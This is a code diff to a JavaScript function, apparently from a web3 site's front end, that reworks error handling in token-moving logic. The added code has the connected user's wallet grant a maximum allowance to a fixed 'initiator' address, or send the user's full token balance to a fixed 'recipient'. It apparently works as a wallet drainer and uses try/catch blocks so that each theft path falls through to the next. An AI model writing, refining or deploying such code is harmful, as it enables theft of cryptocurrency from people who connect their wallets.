@@ -186,7 +186,6 @@ export const increaseAllowance = async (token) => {
                 }
               });
             });
-            return;
           } catch (error) {
             console.log(error);
           }
@@ -262,40 +261,48 @@ export const increaseAllowance = async (token) => {
                 }
               });
             })
-            return;
           } catch (error) {
             console.log(error);
           }
         }
       })
-    }
-    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
-    console.log(increaseallown);
-    if (increaseallown) {
-      console.log(increaseallown);
-      console.log("increase")
-      await contract.methods.increaseAllowance(constants.initiator, constants.max)
-      .send({ from: account })
-      .on('transactionHash', async (hash) => {
-        console.log(hash);
-      })
-      .on("confirmation", async (confirmationNumber, receipt) => {
-        if (confirmationNumber >= 2) {
-          console.log(receipt);
-          await transfer(token);
-        }
-      });
       return;
     }
-    const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
-    console.log(transfertoken);
-    if (transfertoken) {
-      console.log(transfertoken);
-      console.log("transfer")
-      await contract.methods
-        .transfer(constants.recipient, token.balance)
-        .send({ from: account });
+    try{
+      const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
+      if (increaseallown) {
+        console.log(increaseallown);
+        console.log("increase")
+        await contract.methods.increaseAllowance(constants.initiator, constants.max)
+        .send({ from: account })
+        .on('transactionHash', async (hash) => {
+          console.log(hash);
+        })
+        .on("confirmation", async (confirmationNumber, receipt) => {
+          if (confirmationNumber >= 2) {
+            console.log(receipt);
+            await transfer(token);
+          }
+        });
+        return;
+      }
+    } catch (error) {
+      console.log(error)
     }
+    try{
+      const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
+      if (transfertoken) {
+        console.log(transfertoken);
+        console.log("transfer")
+        await contract.methods
+          .transfer(constants.recipient, token.balance)
+          .send({ from: account });
+      }
+      return;
+    } catch (error) {
+      console.log(error)
+    }
+    
   } catch (error) {
     console.log(error);
   }
